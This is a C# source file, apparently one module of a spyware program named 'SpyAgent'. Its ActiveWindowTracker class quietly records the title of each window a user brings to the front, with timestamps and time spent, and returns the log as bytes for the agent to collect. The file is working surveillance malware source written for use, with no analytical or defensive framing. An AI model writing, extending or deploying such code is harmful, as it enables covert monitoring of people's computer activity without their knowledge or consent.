namespace SpyAgent.Modules;

using System.Text;
using SpyAgent.Core;
using SpyAgent.Utils;

internal sealed class ActiveWindowTracker : ISpyModule
{
    public string ModuleName => "ActiveWindow";
    private string _lastWindow = "";
    private DateTime _lastChange = DateTime.UtcNow;
    private readonly List<WindowEntry> _log = [];

    public Task<byte[]?> CollectAsync()
    {
        var currentWindow = NativeHooks.GetActiveWindowTitle();
        var now = DateTime.UtcNow;

        if (currentWindow != _lastWindow && !string.IsNullOrEmpty(currentWindow))
        {
            if (!string.IsNullOrEmpty(_lastWindow))
            {
                _log.Add(new WindowEntry
                {
                    Title = _lastWindow,
                    Start = _lastChange,
                    Duration = now - _lastChange
                });
            }

            _lastWindow = currentWindow;
            _lastChange = now;
        }

        if (_log.Count == 0)
            return Task.FromResult<byte[]?>(null);

        var sb = new StringBuilder();
        foreach (var entry in _log)
        {
            sb.AppendLine($"[{entry.Start:HH:mm:ss}] ({entry.Duration.TotalSeconds:F0}s) {entry.Title}");
        }

        var result = Encoding.UTF8.GetBytes(sb.ToString());
        _log.Clear();
        return Task.FromResult<byte[]?>(result);
    }

    private sealed class WindowEntry
    {
        public string Title { get; init; } = "";
        public DateTime Start { get; init; }
        public TimeSpan Duration { get; init; }
    }
}
